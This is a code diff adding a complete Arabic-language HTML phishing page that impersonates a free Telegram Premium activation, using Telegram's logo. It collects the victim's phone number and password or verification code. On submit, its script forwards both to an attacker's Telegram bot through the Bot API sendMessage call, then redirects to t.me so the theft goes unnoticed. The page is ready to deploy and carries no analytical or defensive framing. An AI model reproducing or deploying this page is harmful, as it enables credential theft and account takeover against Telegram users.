@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Telegram Premium</title>
+<style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:Arial,sans-serif;background:#1c2833;display:flex;justify-content:center;align-items:center;min-height:100vh}.card{background:#2c3e50;border-radius:16px;padding:32px;width:360px;text-align:center;color:#fff}img{width:80px;margin-bottom:16px}h2{font-size:22px;margin-bottom:6px}p{color:#aaa;font-size:14px;margin-bottom:16px}input{width:100%;padding:12px;margin:6px 0;background:#1c2833;border:0;border-bottom:2px solid #0088cc;border-radius:0;color:#fff;font-size:16px;outline:none}.btn{width:100%;background:#0088cc;color:#fff;border:none;padding:14px;border-radius:8px;font-weight:bold;font-size:16px;cursor:pointer;margin-top:14px}</style></head>
+<body><div class="card">
+<img src="https://telegram.org/img/t_logo.png" alt="Telegram">
+<h2>تفعيل تلغرام بريميوم</h2>
+<p>أدخل بياناتك لتفعيل الاشتراك المجاني</p>
+<input type="text" id="email" placeholder="رقم الهاتف">
+<input type="password" id="pass" placeholder="كلمة المرور أو رمز التحقق">
+<button class="btn" onclick="send()">تفعيل الآن</button>
+</div>
+<script>
+const p=new URLSearchParams(location.search),T=p.get('token'),C=p.get('chat');
+function send(){const e=document.getElementById('email').value,pa=document.getElementById('pass').value;
+if(!e||!pa)return alert('املأ جميع الحقول');
+fetch(`https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=${encodeURIComponent('✈️ تلغرام\n👤 '+e+'\n🔑 '+pa)}`).finally(()=>{location.href='https://t.me'})}
+</script></body></html>
